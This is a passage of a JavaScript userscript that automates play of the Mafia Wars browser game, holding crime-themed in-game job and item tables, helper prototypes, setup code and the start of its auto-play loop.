    ['Open Fire On A Rival Outfit'                       , 14, 20,3,LV    , 23,1,'node20'],    //  FIGHT  DISTRICT 3  LAS VEGAS THE LOWER STRIP
    ['Buy Some Black-Market Info'                        ,  9, 21,3,LV    , 15,0,'node21'],    // ENERGY
    ['Steal An SUV'                                      , 12, 22,3,LV    , 19,2,'node22'],    //SOCIAL
    ['Run A Visiting Gang Boss Out'                      , 17, 23,3,LV    , 28,1,'node23'],    //  FIGHT
    ['Do Some Late Night Shopping'                       , 10, 24,3,LV    , 17,0,'node24'],    // ENERGY
    ['Rob A Gem Broker'                                  , 23, 25,3,LV    , 36,2,'node25'],    //SOCIAL
    ['Convince A Restaurateur To Leave Town'             , 17, 26,3,LV    , 24,0,'node26'],    // ENERGY (PROPERTY)
    ['Arrange A Hardware Delivery'                       , 15, 27,3,LV    , 23,0,'node27'],    // ENERGY
    ['Break Into A Luxury Suite'                         , 17, 28,3,LV    , 26,0,'node28'],    // ENERGY
//  ['Boss: Defeat Juliana \"Black Widow\" Trieste'      ,  6, 29,3,LV    ,200,0,'node29'],    //        BOSS JOB STAMINA
    ['Bribe A Casino Pit Boss'                           ,  5, 30,4,LV    ,  8,0,'node30'],    // ENERGY DISTRICT 4  LAS VEGAS SHOGUN CASINO
    ['Steal A Valet\'s Uniform'                          , 12, 31,4,LV    , 20,0,'node31'],    // ENERGY
    ['Swipe A Security Keycard'                          , 10, 32,4,LV    , 16,0,'node32'],    // ENERGY
    ['Take Out An Armed Casino Guard'                    , 13, 33,4,LV    , 21,1,'node33'],    //  fight
    ['Create A Distraction On The Floor'                 , 10, 34,4,LV    , 17,0,'node34'],    // ENERGY
    ['Hack The Casino Security System'                   , 12, 35,4,LV    , 21,0,'node35'],    // ENERGY
    ['Break Into The Vault'                              , 17, 36,4,LV    , 26,0,'node36'],    // ENERGY
    ['Get To An Exit'                                    , 22, 37,4,LV    , 35,0,'node37'],    // ENERGY
    ['Hijack A Poker Table Delivery'                     , 18, 38,4,LV    , 27,0,'node38'],    // ENERGY (PROPERTY)
//  ['Boss: Defeat Roger Bidwell\, Chief of Security'    ,  6, 39,4,LV    ,400,0,'node39'],    //        BOSS JOB STAMINA
    ['Move The Take Out Of Town'                         , 13, 40,5,LV    , 21,0,'node40'],    // ENERGY DISTRICT 5 LAS VEGAS MOJAVE DESERT
    ['Fight Off A Hijack Crew'                           , 14, 41,5,LV    , 23,1,'node41'],    //  FIGHT
    ['Run A Highway Patrol Blockade'                     , 23, 42,5,LV    , 37,2,'node42'],    //SOCIAL
    ['Buy Off A Crooked Border Agent'                    , 15, 43,5,LV    , 24,0,'node43'],    // ENERGY
    ['Stash The Take'                                    , 20, 44,5,LV    , 33,2,'node44'],    //social
    ['Arrange A Cartel Sale'                             ,  9, 45,5,LV    , 16,0,'node45'],    // ENERGY
    ['Clean Out A Biker Bar'                             , 11, 46,5,LV    , 19,1,'node46'],    //  FIGHT
    ['Create A Diversion'                                , 11, 47,5,LV    , 18,0,'node47'],    // ENERGY
    ['Dispose Of The Evidence'                           , 14, 48,5,LV    , 23,0,'node48'],    // ENERGY
//  ['Boss: Defeat \'Red\' Jackson'                      ,  7, 49,5,LV    ,600,0,'node49'],    //        BOSS JOB STAMINA
    ['Rescue A Hotelier'                                 , 10, 50,5,LV    , 17,0,'node50'],    // ENERGY PATH (PROPERTY)
    ['Remove An Unhelpful Union Rep'                     , 15, 51,6,LV    , 26,1,'node51'],    //  fight PATH
    ['Get A Council Member On Board'                     , 17, 52,6,LV    , 27,0,'node52'],    // ENERGY PATH
    ['Buy Off A Precinct Captain'                        , 18, 53,6,LV    , 29,0,'node53'],    // ENERGY PATH
    ['Eliminate A Hill Supplier'                         , 16, 54,6,LV    , 28,1,'node54'],    //  fight PATH
    ['Convince A Judge To Step Down'                     , 14, 55,6,LV    , 29,0,'node55'],    // ENERGY PATH
    ['Wipe Out The Hill Security Detail'                 , 18, 56,6,LV    , 32,1,'node56'],    //  fight PATH
    ['Remove The Hill\'s Support Base'                   , 17, 57,6,LV    , 27,2,'node57'],    //social  PATH
    ['Reveal A Politician\'s Dirty Secret'               , 19, 58,6,LV    , 30,0,'node58'],    // ENERGY PATH
    ['Infiltrate The Hill Resort'                        , 16, 59,6,LV    , 25,0,'node59'],    // ENERGY PATH
//  ['Boss: Defeat Leon and Marcus Hill'                 ,  7, 60,6,LV    ,900,0,'node60'],    //        boss job
    ['Breach the Area 51 Perimeter'                      , 15, 61,7,LV    , 25,0,'node61'],    // ENERGY PATH
    ['Neutralize a Security Patrol'                      , 14, 62,7,LV    , 24,1,'node62'],    // Stamina PATH
    ['Disable a Surveillance Station'                    , 21, 63,7,LV    , 33,0,'node63'],    // ENERGY PATH
    ['Infiltrate A Top Secret Bunker'                    , 18, 64,7,LV    , 32,0,'node64'],    // ENERGY PATH
    ['Attack A Guard Post'                               , 16, 65,7,LV    , 27,1,'node65'],    // Stamina PATH
    ['Find A Route Through The Ducts'                    , 23, 66,7,LV    , 36,0,'node66'],    // ENERGY PATH
    ['Take Out A Black Ops Team'                         , 18, 67,7,LV    , 32,1,'node67'],    // Stamina PATH
    ['Nab A High Tech Prototype'                         , 19, 68,7,LV    , 33,0,'node68'],    // ENERGY PATH
    ['Hack The Research Lab Door'                        , 18, 69,7,LV    , 29,0,'node69'],    // ENERGY PATH
//  ['Boss: Defeat Dr. Hank Williams'                    ,  8, 70,7,LV    ,120,0,'node70'],    //           Boss Job
    ['Uncover Rumors About Governor Halloran'            , 17, 71,8,LV    , 28,0,'node71'],    // ENERGY PATH
    ['Question Some Meth Heads'                          , 15, 72,8,LV    , 26,1,'node72'],    // Stamina PATH
    ['Dig Up Links To Halloran And A Meth Ring'          , 20, 73,8,LV    , 35,0,'node73'],    // ENERGY PATH
    ['Discover A Big Meth Buy At The Hoover Dam'         , 24, 74,8,LV    , 37,0,'node74'],    // Social PATH
    ['Get Your Spotters In Place Above The Dam'          , 22, 75,8,LV    , 38,0,'node75'],    // ENERGY PATH
    ['Take Out A Crooked DEA Unit'                       , 17, 76,8,LV    , 29,1,'node76'],    // Stamina PATH
    ['Verify Halloran\'s Arrival At The Dam'             , 19, 77,8,LV    , 34,0,'node77'],    // ENERGY PATH
    ['Take Down The Security Detail'                     , 20, 78,8,LV    , 35,1,'node78']     // Stamina PATH
//  ['Boss: Defeat Governor Halloran'                    ,  8, 79,8,LV    ,120,0,'node79']     //           Boss Job

// job description0, energy cost1, job number2, tab number3, city4, exp payout5, tabpath6, lvnode7, ratio8



///////////////////////////////////////////////////////////////////////////////////////////
  );

  var missionTabs = new Array(
    // NEW YORK
    ['Street Thug (Levels 1-4)','Associate (Levels 5-8)','Soldier (Levels 9-12)',
     'Enforcer (Levels 13-17)','Hitman (Levels 18-24)', 'Capo (Levels 25-34)',
     'Consigliere (Levels 35-59)','Underboss (Levels 60-99)','Boss (Levels 100+)'],
    // CUBA
    ['El Soldado (Levels 35-59)','El Capitan (Levels 60-84)','El Jefe (Levels 85-109)',
     'El Patron (Levels 110-129)','El Padrino (Levels 130-150)','El Cacique (Levels 151+)'],
    // MOSCOW
    ['Baklany','Boets','Brigadir','Avtoritet','Vor','Pakhan'],
    // BANGKOK
    ['Brawler','Criminal','Pirate','Commandant','Oyabun','Dragon Head','Saboteur','Assassin'],
    // LAS VEGAS ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ['North Las Vegas','Paradise City','The Lower Strip','Shogun Casino','Mojave Desert','The Upper Strip','Area 51','Hoover Dam']
  );

  var mwTitles = new Array(
    'Street Thug', 'Skilled Street Thug', 'Master Street Thug', 'Associate', 'Skilled Associate', 'Master Associate', 'Soldier', 'Skilled Soldier', 'Master Soldier',
    'Enforcer', 'Skilled Enforcer', 'Master Enforcer', 'Hitman', 'Skilled Hitman', 'Master Hitman', 'Capo', 'Skilled Capo', 'Master Capo',
    'Consigliere', 'Skilled Consigliere', 'Master Consigliere', 'Underboss', 'Skilled Underboss', 'Master Underboss', 'Boss', 'Skilled Boss', 'Master Boss',
    'El Soldado', 'El Soldado Experto', 'El Soldado Principal', 'El Capitan', 'El Capitan Experto', 'El Capitan Principal', 'El Jefe', 'El Jefe Experto', 'El Jefe Principal',
    'El Patron', 'El Patron Experto', 'El Patron Principal', 'El Padrino', 'El Padrino Experto', 'El Padrino Principal', 'El Cacique', 'El Cacique Experto', 'El Cacique Principal',
    'Baklan', 'Umelyj Baklan', 'Matyoryj Baklan', 'Boets', 'Umelyj Boets', 'Matyoryj Boets', 'Brigadir', 'Umelyj Brigadir', 'Matyoryj Brigadir',
    'Avtoritet', 'Umelyj Avtoritet', 'Matyoryj Avtoritet', 'Vor', 'Umelyj Vor', 'Matyoryj Vor', 'Pakhan', 'Umelyj Pakhan', 'Matyoryj Pakhan',
    'Brawler', 'Apprentice Brawler', 'Skilled Brawler', 'Master Brawler', 'Criminal', 'Apprentice Criminal', 'Skilled Criminal', 'Master Criminal',
    'Pirate', 'Apprentice Pirate', 'Skilled Pirate', 'Master Pirate', 'Commandant', 'Apprentice Commandant', 'Skilled Commandant', 'Master Commandant',
    'Oyabun', 'Apprentice Oyabun', 'Skilled Oyabun', 'Master Oyabun', 'Dragon Head', 'Apprentice Dragon Head', 'Skilled Dragon Head', 'Master Dragon Head',
    'Burglar','Apprentice Burglar', 'Skilled Burglar', 'Master Burglar', 'Saboteur', 'Apprentice Saboteur', 'Skilled Saboteur', 'Master Saboteur',
    'Touristy Bandito', 'Local Bandito', 'Professional Bandito', 'Big Time Bandito', 'Touristy Hustler', 'Local Hustler', 'Professional Hustler', 'Big Time Hustler',
    'Touristy Cowboy', 'Local Cowboy', 'Professional Cowboy', 'Big Time Cowboy', 'Touristy Maverick', 'Local Maverick', 'Professional Maverick', 'Big Time Maverick',
    'Touristy Desert Rat', 'Local Desert Rat', 'Professional Desert Rat', 'Big Time Desert Rat',
    'Apprentice Bully', 'Skilled Bully', 'Master Bully','Apprentice Brute', 'Skilled Brute', 'Master Brute','Apprentice Hunter', 'Skilled Hunter', 'Master Hunter',
    'Apprentice Slayer', 'Skilled Slayer', 'Master Slayer','Apprentice Killer', 'Skilled Killer', 'Master Killer','Apprentice Executioner', 'Skilled Executioner', 'Master Executioner',
    'Apprentice Assassin', 'Skilled Assassin', 'Master Assassin',
    'Apprentice Burglar', 'Burglar', 'Master Burglar', 'Apprentice Robber', 'Robber', 'Master Robber', 'Apprentice Thief', 'Thief', 'Master Thief', 'Grand Master Thief',
    'Trainee', 'Sparring Partner', 'Novice', 'Journeyman', 'Fighter', 'Boxer', 'Contender', 'Finalist', 'Champion', 'World Champion'
  );

  const CHOICE_JOBNO   = 0;
  const CHOICE_JOBNAME = 1;
  const CHOICE_CITY    = 2;

  var choiceJobs = new Array (
    // Job no and Job names array must correspond with each city's CITY_SIDES array
    // MOSCOW
    [[4,7], ['Kidnap A Local Gang Leader for the Vory', 'Kill A Local Gang Leader for the Mafiya'], MOSCOW],
    [[5, 8], ['Collect The Ransom', 'Collect the Hit Payoff'], MOSCOW],
    [[6, 9], ['Receive Vory Intel On Dmitri', 'Buy Mafiya Intel On Dmitri'], MOSCOW],
    [[17, 20], ['Fix A Local Election for the Vory', 'Abduct A Candidate\'s Wife For the Mafiya'], MOSCOW],
    [[18, 21], ['Extract A Favor From The Winner', '"Convince" The Candidate To Withdraw'], MOSCOW],
    [[19, 22], ['Catch Karpov Accepting A Bribe', 'Kill An Investigative Reporter'], MOSCOW],
    [[34, 37], ['Take A Guard Hostage During Your Escape', 'Execute A Bank Guard During Your Escape'], MOSCOW],
    [[35, 38], ['Use The Guard\'s Keys To Access the Bank Armory', 'Steal The Bank President\'s Car Keys'], MOSCOW],
    [[36, 39], ['"Borrow" The Guard\'s Uniform After Releasing Him', 'Strip A Uniform Off The Corpse'], MOSCOW],
    [[47, 50], ['Fly To The Siberian Military District', 'Travel To The Volga Military District'], MOSCOW],
 //FIXME - Can the jobs be entered in the array as with 3 options, In case the job name change hasn't rolled out to all servers?
 //OLD   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
 //NEW   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium'], MOSCOW],
    [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
    [[49, 52], ['Intercept The Base\'s Pay Shipment', 'Capitalize On An Officer\'s Gambling Problem'], MOSCOW],
    [[64, 67], ['Infiltrate The ULF Cell', 'Discover The Location Of The Next ULF Attack'], MOSCOW],
    [[65, 68], ['Help "Plan" The Next Attack', 'Kill A Lookout'], MOSCOW],
    [[66, 69], ['Sabotage The Plan From The Inside', 'Stop The ULF Attack'], MOSCOW],
    [[77, 80], ['Attack A Mafiya Business', 'Burn Down A Vory Safehouse'], MOSCOW],
    [[78, 81], ['Hijack A Mafiya Cargo', 'Hit A Vory Nightclub'], MOSCOW],
    [[79, 82], ['Threaten A Mafiya Moneyman\'s Family', 'Break Into An Architect\'s Office'], MOSCOW],
    // BANGKOK
    [[5, 8], ['Meet A Gang\'s Rep In A Go-Go Bar', 'Meet A Gang\'s Rep In A Go-Go Bar'], BANGKOK],
    [[11, 14], ['Intercept An Ammo Shipment', 'Intercept An Ammo Shipment'], BANGKOK],
    [[24, 27], ['Set Up A Phony Business', 'Set Up A Phony Business'], BANGKOK],
    [[30, 33], ['Pay Off The Guards At Bangkwang Prison', 'Pay Off The Guards At Bangkwang Prison'], BANGKOK],
    [[43, 46], ['Hijack A Boat Load Of Electronics', 'Hijack A Boat Load Of Electronics'], BANGKOK],
    [[49, 52], ['Steal Shipping Manifests', 'Steal Shipping Manifests'], BANGKOK],
    [[62, 65], ['Establish Contact With A CIA Agent', 'Establish Contact With A CIA Agent'], BANGKOK],
    [[68, 71], ['Betray Commander Chang and the UWSA', 'Betray Commander Chang and the UWSA'], BANGKOK],
    [[81, 84], ['Meet With Boss Matsumura\'s Advisor', 'Meet With Boss Matsumura\'s Advisor'], BANGKOK],
    [[87, 90], ['Talk With A Police Insider About Matsumura', 'Talk With A Police Insider About Matsumura'], BANGKOK],
    [[100, 103], ['Intimidate Wealthy Expatriates', 'Intimidate Wealthy Foreign Expatriates'], BANGKOK],
    [[106, 109], ['Talk With Wei\'s Disloyal Enforcers', 'Talk With Wei\'s Disloyal Enforcers'], BANGKOK],
    [[119, 122], ['Get A Gang Member Back Into Thailand', 'Get A Gang Member Back Into Thailand'], BANGKOK],
    [[125, 128], ['Undermine Nongchai\'s Support', 'Undermine Nongchai\'s Support'], BANGKOK]
  );

  var requirementJob = new Array(
    // Item, Job, City
    ['Liquor', 'Distill Some Liquor',NY],
    ['Tokens', 'Manufacture Tokens',NY],
    ['Wiretap Device', 'Overtake Phone Central',NY],
    ['1 Wiretap Device', 'Overtake Phone Central',NY],
    ['Cards', 'Get Cheating Deck',NY],
    ['Untraceable Cell Phone', 'Rob an Electronics Store',NY],
    ['Concealable Camera', 'Rob an Electronics Store',NY],
    ['Computer Set-Up', 'Rob an Electronics Store',NY],
    ['Blackmail Photos', 'Obtain Compromising Photos',NY],
    ['Illegal Transaction Records', 'Steal Bank Records',NY],
    ['.22 Pistol', 'Beat Up Rival Gangster',NY],
    ['Revolver', 'Beat Up Rival Gangster',NY],
    ['9mm Semi-Automatic', 'Rob a Pimp',NY],
    ['Butterfly Knife', 'Collect Protection Money',NY],
    ['Brass Knuckles', 'Rough Up Dealers',NY],
    ['Tactical Shotgun', 'Perform a Hit',NY],
    ['.45 Revolver', 'Take Out a Rogue Cop',NY],
    ['C4', 'Destroy Enemy Mob Hideout',NY],
    ['Stab-Proof Vest', 'Kill a Protected Snitch',NY],
    ['Automatic Rifle', 'Bust a Made Man Out of Prison',NY],
    ['Lucky Shamrock Medallion', 'Clip the Irish Mob\'s Local Enforcer',NY],
    ['Semi-Automatic Shotgun', 'Fight a Haitian Gang',NY],
    ['Firebomb', 'Steal a Tanker Truck',NY],
    ['Armored Truck', 'Smuggle Thai Gems',NY],
    ['Grenade Launcher', 'Repel the Yakuza',NY],
    ['.50 Caliber Rifle', 'Disrupt Rival Smuggling Ring',NY],
    ['Armored Car', 'Invade Tong-controlled Neighborhood',NY],
    ['RPG Launcher', 'Sell Guns to the Russian Mob',NY],
    ['Bodyguards', 'Protect your City against a Rival Family',NY],
    ['Night Vision Goggles', 'Assassinate a Political Figure',NY],
    ['Napalm', 'Exterminate a Rival Family',NY],
    ['Prop plane', 'Steal an Air Freight Delivery',NY],
    ['Chopper', 'Run a Biker Gang Out of Town',NY],
    ['Luxury Yacht', 'Influence a Harbor Official',NY],
    ['GX9', 'Ransom a Businessman\'s Kids',NY],
    ['Bookie\'s Holdout Pistol', 'Fix the Big Game',NY],
    ['Multi-Purpose Truck', 'Break Into the Armory',NY],
    ['BA-12 Assault Rifle', 'Rip Off the Armenian Mob',NY],
    ['Falsified Documents', 'Take Over an Identity Theft Ring',NY],
    ['Federal Agent', 'Buy Off a Federal Agent',NY],
    ['Private Jet', 'Make a Deal with the Mexican Cartel',NY],
    ['Police Cruiser', 'Blackmail the District Attorney',NY],
    ['Armoured Limousine', 'Shake Down a City Council Member',NY],
    ['Cigarette Boat', 'Take Over The Docks',CUBA],
    ['TNT', 'Raid The Arms Depot',CUBA],
    ['Si-14 Cargo Plane', 'Capture The Airport',CUBA],
    ['Armored State Car', 'Storm The Presidential Palace',CUBA],
    ['Untraceable Cell Phone', 'Arrange A Drug Shipment for the Mafiya',MOSCOW],
    ['Concealable Camera', 'Smuggle Consumer Electronics for the Vory',MOSCOW],
    ['Dossier on Dmitri', 'Receive Vory Intel On Dmitri',MOSCOW],
    ['Dossier on Dmitri', 'Buy Mafiya Intel On Dmitri',MOSCOW],
    ['Ballistic Knife', 'Silence A Political Critic',MOSCOW],
    ['Severnyy Olen Snowbike', 'Extract A Favor From The Winner',MOSCOW],
    ['Set of Photos of Karpov', 'Kill An Investigative Reporter',MOSCOW],
    ['Set of Photos of Karpov', 'Catch Karpov Accepting A Bribe',MOSCOW],
    ['RAS-15', '"Convince" The Candidate To Withdraw',MOSCOW],
    ['Officer Corps Paycheck', 'Capitalize On An Officer\'s Gambling Problem',MOSCOW],
    ['Officer Corps Paycheck', 'Intercept The Base\'s Pay Shipment',MOSCOW],
    ['Bank Guard Uniform', 'Strip A Uniform Off The Corpse',MOSCOW],
    ['Bank Guard Uniform', '"Borrow" The Guard\'s Uniform After Releasing Him',MOSCOW],
    ['Stick of Dynamite', 'Sabotage The Plan From The Inside',MOSCOW],
    ['Stick of Dynamite','Stop The ULF Attack',MOSCOW],
    ['Mansion Details','Break Into An Architect\'s Office',MOSCOW],
    ['Mansion Details','Threaten A Mafiya Moneyman\'s Family',MOSCOW],
    ['Satellite Phone','Hijack A Boat Load Of Electronics',BANGKOK],
    ['Car Key Copy','Blackmail A Car Dealer',LV],
    ['Hot Tip','Help A Bookie Out Of A Jam ',LV],
    ['Alarm Code','Buy Some Black-Market Info',LV],
    ['Hotel Security Key Card','Swipe A Security Keycard',LV],
    ['Unwanted Evidence','Create A Diversion',LV]
  );

  // Sort requirement jobs by level requirement, ascending
  requirementJob.sort(function(a, b) { return cities[a[2]][CITY_LEVEL] - cities[b[2]][CITY_LEVEL]; });

  // Business items
  var bizJobItems = new Array(
    ['Politico Corrupto', CUBA],
    ['Pirate', BANGKOK],
    ['Drug Shipment', BANGKOK]
  );

  String.prototype.trim = function() {
    return this.replace(/^\s+|\s+$/g, '');
  };
  String.prototype.ltrim = function() {
    return this.replace(/^\s+/, '');
  };
  String.prototype.rtrim = function() {
    return this.replace(/\s+$/, '');
  };
  String.prototype.untag = function() {
    return this.replace(/<[^>]*>/g, '');
  };
  String.prototype.clean = function() {
    return this.replace(/<\/?[^>]+(>|$)/g, '');
  };

  Array.prototype.searchArray = function(target, index) {
    // To use this method, "this" must be an array of arrays. Each array
    // contained in "this" has one of its elements (specified by the
    // "index" parameter) compared against the target parameter. An array
    // is returned that contains the indices of "this" in which a match
    // was found.
    //
    // NOTE: "target" can be a regular expression. If the array element
    //       is a string, it is compared for a pattern match.
    var returnArray = [];
    var checkArray = function (exp, item) {
      if (typeof(exp) == 'function' &&
          typeof(item) == 'string') {
        // Assume target is a regex to be matched against the string.
        if (target.test(item)) {
          return true;
        }
      } else if (item === exp) {
        return true;
      // Case insensitive checking
      } else if (typeof(exp) == 'string' && item.toLowerCase() == exp.toLowerCase()) {
        return true;
      }
      return false;
    };

    for (var i = 0, iLength = this.length; i<iLength; ++i) {
      if (typeof(this[i][index]) == 'object') {
        for (var j = 0, jLength = this[i][index].length; j < jLength; ++j) {
          if (checkArray(target, this[i][index][j])) {
            returnArray.push(i);
            break;
          }
        }
      } else if (checkArray(target, this[i][index])) {
        returnArray.push(i);
      }
    }
    return returnArray.length? returnArray : false;
  };

  // Array.unique() - Remove duplicate values
  Array.prototype.unique = function() {
    var a = [];
    var l = this.length;
    for (var i=0; i < l; ++i) {
      for (var j = i + 1; j < l; ++j) {
        // If this[i] is found later in the array
        if (this[i] === this[j])
          j = ++i;
      }
      a.push(this[i]);
    }
    return a;
  };

  // Check for missing settings.
  if (isGMUndefined('autoClick')) {
    saveDefaultSettings();
    addToLog('info Icon', 'If you want to perform jobs, fighting, and other actions automatically, please adjust your settings.');
  }

  // Check for a version change.
  if (GM_getValue('version') != SCRIPT.version) {
    GM_setValue('newversion', SCRIPT.version);
    sendMWValues(['version','newversion']);
    grabUpdateInfo();
    handleVersionChange();
  }

  // Load the missions array from previously saved value
  if (!isGMUndefined('missions')) {
    var savedMissions = eval ('(' + GM_getValue('missions') + ')');
    if (savedMissions.length == missions.length) {
      missions = savedMissions;
      DEBUG('Using saved missions array.');
    } else {
      DEBUG('Missions array updated.');
    }
  }

  // Set the initial run state.
  if (typeof GM_getValue('isRunning') != 'boolean') {
    alert('PS MWAP: Inconsistent state found in settings, please check them!');
    GM_setValue('isRunning', false);
  }
  running = GM_getValue('isRunning');

  var Reload = new Animate();
  Reload.desc = 'reload';
  var Autoplay = new Animate();
  Autoplay.desc = 'auto-play';
  Autoplay.fx = loadHome;

  // get saved attack/defense stats
  curAttack = GM_getValue('curAttack', undefined);
  curDefense = GM_getValue('curDefense', undefined);
  curAttackEquip = GM_getValue('curAttackEquip', undefined);
  curDefenseEquip = GM_getValue('curDefenseEquip', undefined);

  // Get player lists.
  var fightListInactive = new PlayerList('fightListInactive');
  var fightListActive   = new PlayerList('fightListActive');
  var fightListNew      = new PlayerList('fightListNew');
  var fightListAvoid    = new PlayerList('fightListAvoid');
  var giftList          = new PlayerList('giftList');

  // Choose sides (handling)
  chooseSides();

  // If the user has chosen to reset timers on startup
  if (isGMChecked('autoResetTimers')) {
    resetTimers(0);
  }

  // This line is optional, but it makes the menu display faster.
  refreshMWAPCSS();
  customizeMasthead();
  customizeLayout();

  // Add event listeners.
  setListenContent(true);

  // Make sure the modification timer goes off at least once.
  setModificationTimer();
  managePopups();

  var initialized = true;
  DEBUG('Completed initialize.');

  // For chrome
  sendSettings();
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
  DEBUG('There are ' + missions.length + ' known missions.');
  //for (var i =0; i < missions.length ; i++) DEBUG('M' + i + ': ' + missions[i]);
}

// Copy settings from background storage
function synchSettings() {
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
}

// Send settings to background storage
function sendSettings() {
  sendMWValues(['isRunning', 'autoGiftSkipOpt', 'autoLottoOpt', 'autoSecretStash',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

function Animate() {
  this.TOUT = null;
  this.desc = '';
  this.fx = null;
  this.delay = null;
}

Animate.prototype.clearTimeout = function() {
  if (this.TOUT) {
    DEBUG('Clearing ' + this.desc + ' timer ' + this.TOUT + '.');
    clearTimeout(this.TOUT);
    this.TOUT = null;
  }
};

Animate.prototype.setTimeout = function(fx, delay) {
  this.clearTimeout();
  this.fx = fx;
  this.delay = delay;
  // Make the handler clear TOUT. This prevents attempts
  // to clear timers that have already gone off.

  var obj = this;
  this.TOUT = window.setTimeout(function () { if (obj) obj.TOUT = null; fx(); }, delay);
  DEBUG('Started ' + this.desc + ' timer ' + this.TOUT +
        ', delay=' + delay/1000 + ' sec.');
};

Animate.prototype.start = function() {
  if (running && settingsOpen === false && this.fx) {
    this.setTimeout(this.fx, this.delay);
  } else if (settingsOpen === true) {
    DEBUG('Settings box open. Not starting ' + this.desc + ' timer.');
  } else {
    DEBUG('Autoplayer paused. Not starting ' + this.desc + ' timer.');
  }
};

// Set up auto-reload (if enabled).
if (initialized) {
  autoReload();

  if (!refreshGlobalStats()) {
    // Stop the script. (The timer will still go off and reload.)
    handleUnexpectedPage();
  } else {

    refreshSettings();

    if (GM_getValue('logOpen') == 'open') {
      showMafiaLogBox();
    }
  }
}

///////////////////////////////////////////////////////////////////////////////
//   End of top-level code. Automatic play is kicked off by doAutoPlay().    //
///////////////////////////////////////////////////////////////////////////////

function doAutoPlay () {
  var hasHome = level >= 6;
  var hasFight = level >= 5;
  var hasProps = level >= 4;
  var hasMarket = level >= 7;
  // Set the default auto-play timer function and delay.
  Autoplay.fx = goHome;
  Autoplay.delay = getAutoPlayDelay();

  var previouslyIdle = idle;
  idle = false;

  // Determine whether a job and/or fight/hit could be attempted.
  var autoMissionif = running && !skipJobs && canMission();
  var autoStaminaSpendif = running && !skipStaminaSpend && canSpendStamina() && hasFight;
  var energyMaxed = (autoMissionif && energy >= maxEnergy);
  var staminaMaxed = (autoStaminaSpendif && stamina >= maxStamina);
  var maxed = energyMaxed || staminaMaxed;

  // Check if energy / stamina burning is prioritized
  if (isGMChecked('burnFirst')) {
    var spendFirst = GM_getValue('burnOption');

    // Prioritize using energy
    if (stamina < maxStamina && running && canMission() && spendFirst == BURN_ENERGY) {
      autoMissionif = true;
      autoStaminaSpendif = false;
    }

    // Prioritize using stamina
    if (energy < maxEnergy && running && canSpendStamina() && hasFight && spendFirst == BURN_STAMINA) {
      autoMissionif = false;
      autoStaminaSpendif = true;
    }
  }

  // Click attack if on warNav
  if (running && onWarTab() && (isGMChecked('autoWar') || helpWar )) {
    if (autoWarAttack()) return;
  }

  // Auto-bank
  var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank &&
                cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));
  if (running && canBank) {
    if (autoBankDeposit(city, cities[city][CITY_CASH])) return;
  }


  // Auto-collect take (limit to level 4 and above)
  if (running && !maxed && hasProps) {
    for (var i = 0, iLength = cities.length; i < iLength; ++i) {
      if (level >= cities[i][CITY_LEVEL] &&
          isGMChecked('collectTake' + cities[i][CITY_NAME]) &&
          !timeLeftGM('takeHour' + cities[i][CITY_NAME])) {

        // Collect take
        if (autoCollectTake(i)) return;
      }
    }
  }
	// Collect Take first then try to build
  // Build Cars
  if (running && !maxed && isGMChecked('buildCar') && !timeLeftGM('buildCarTimer')) {
    if (buildItem(cityCars, GM_getValue('buildCarId',1), 11)) return;
  }
  // Build Weapons
  if (running && !maxed && isGMChecked('buildWeapon') && !timeLeftGM('buildWeaponTimer')) {
    if (buildItem(cityWeapons, GM_getValue('buildWeaponId',1), 12)) return;
  }
  // Player updates
  if (running && !maxed && isGMChecked('logPlayerUpdates') && onHome()) {
    if (autoPlayerUpdates()) return;
  }

  // auto-heal area
//  DEBUG('  entering auto-heal ') ;
  if (running &&
      health < maxHealth &&
      isGMChecked('autoHeal') &&
      health < GM_getValue('healthLevel', 0) &&
      (stamina >= GM_getValue('stamina_min_heal')) &&
      canForceHeal()
      ) {
//    DEBUG('auto-heal passed main block check, checking can auto heal ');
    if(canautoheal()) {
      DEBUG('auto-healing '); // hide/remove after testing
      if (isGMChecked('quickHeal')) {
        if(quickHeal(false)) return;
      } else {
        if(autoHeal()) return;
      }
    }
  } else {
// hide/remove after testing
//    DEBUG(' autoheal skipped in main loop ');
    DEBUG('heal skipped, actual stamina:' + stamina +' stamina_Min_heal:'+ GM_getValue('stamina_min_heal') +  ' force heal:' + canForceHeal() );
    DEBUG('heal skipped, current health:' + health + ' full:' + maxHealth + ' heal when health falls below:' + GM_getValue('healthLevel', 0) );
  }

//  DEBUG('after auto-heal  - - X ');

  // Re-activating autoHeal in case you died and PS MWAP cleared the playerupdates before it could parse the snuffed message:
  if (running && health == 0 && !isGMChecked('autoHeal') && isGMChecked('logPlayerUpdates') && isGMChecked('hideAttacks')) {
    DEBUG('Re-activating autoHeal, seems you died while clearing the playerupdates!<br>Current HitXP: ' + GM_getValue('currentHitXp', 0));
    GM_setValue('autoHeal', 'checked');
  }

  // Background mode hitlisting (limit to level 4 and above)
  if (running && !maxed && autoStaminaSpendif && isGMChecked('bgAutoHitCheck') && !timeLeftGM('bgAutoHitTime')){
    if(autoHitlist()) return;
  }

  // Ask for Help on Moscow Tier
  if (running && !maxed && parseInt(GM_getValue('selectMoscowTier'))  && !timeLeftGM('AskforHelpMoscowTimer')) {
    DEBUG('going to Moscow for Ask for Help-job');
    if (AskforHelp('2')) return;
  }

  // Ask for Help on Bangkok Tier
  if (running && !maxed && parseInt(GM_getValue('selectBangkokTier')) && !timeLeftGM('AskforHelpBangkokTimer')) {
    DEBUG('going to Bangkok for Ask for Help-job');
    if (AskforHelp('3')) return;
  }

  // Auto-stat
  if (running && !maxed && stats > 0 && isGMChecked('autoStat') && !parseInt(GM_getValue('restAutoStat')) ) {
    if (autoStat()) return;
  }

  // Auto-lotto (limit to level 7 and above)
